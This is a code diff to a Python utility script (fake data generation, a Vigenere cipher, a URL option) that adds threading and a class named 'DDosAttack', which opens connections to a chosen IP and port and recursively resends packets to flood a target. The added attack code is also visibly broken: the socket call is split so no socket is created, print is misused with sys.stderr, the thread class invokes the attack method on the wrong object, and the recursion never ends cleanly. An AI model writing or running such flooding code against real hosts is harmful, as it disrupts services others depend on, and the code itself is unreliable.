@@ -3,6 +3,9 @@ import requests
 from bs4 import BeautifulSoup
 from cryptography.fernet import Fernet
 import hashlib
+import socket
+import sys
+import threading
 class FakeDataGenerator:
     def __init__(self, language='en_US'):
         self.fake = Faker(language)
@@ -89,6 +92,55 @@ class VigenereCipher:
             key = ''.join([self.alphabet[(self.alphabet.index(c) + i) % 26] for c in self.alphabet])
             print(f'Key: {key}, Decrypted text: {self.decrypt(key)}')
 
+class myThread(threading.Thread):
+    def __init__(self, threadID, name, counter):
+        threading.Thread.__init__(self)
+        self.threadID = threadID
+        self.name = name
+        self.counter = counter
+
+    def run(self):
+        print("Starting " + self.name)
+        DDosAttack.attack(self)
+        print("Exiting " + self.name)
+
+class DDosAttack:
+    def __init__(self, ip,port,thread,packet):
+        self.ip = ip
+        self.port = port
+        self.thread = thread
+        self.packet = packet
+
+    def attack(self):
+        # Create a TCP/IP socket
+        sock = socket.socket
+        (socket.AF_INET, socket.SOCK_STREAM)
+        # Connect the socket to the port where the server is listening
+        server_address = (self.ip, self.port)
+        print(sys.stderr, 'connecting to %s port %s' % server_address)
+        sock.connect(server_address)
+        try:
+            # Send data
+            threadmsg = 'Thread-', self.thread, ':', self.packet
+            message = str.encode(str(threadmsg))
+            print(sys.stderr, 'thread-', self.thread, 'sending "%s"' % message)
+            sock.sendall(message)
+            # Look for the response
+            amount_received = 0
+            amount_expected = len(message)
+            while amount_received < amount_expected:
+                data = sock.recv(16)
+                amount_received += len(data)
+                print(sys.stderr, 'thread-', self.thread, 'received "%s"' % data)
+        finally:
+            print(sys.stderr, 'thread-', self.thread, 'closing socket')
+            sock.close()
+        i=0
+        while i<self.packet:
+            i=i+1
+            attack = DDosAttack(self.ip,self.port,self.thread,self.packet)
+            attack.attack()
+
 
 if __name__ == '__main__':
     print("Welcome to the main program")
@@ -119,7 +171,7 @@ if __name__ == '__main__':
             else:
                 print("Invalid input")
                 exit(0)
-            fakeData = FakeDataGenerator(language)
+            fakeData = FakeDataGenerator(language) # default language is English
             print(fakeData.generate_data())
         elif option == 2:
             url = input("Please enter a URL: ")
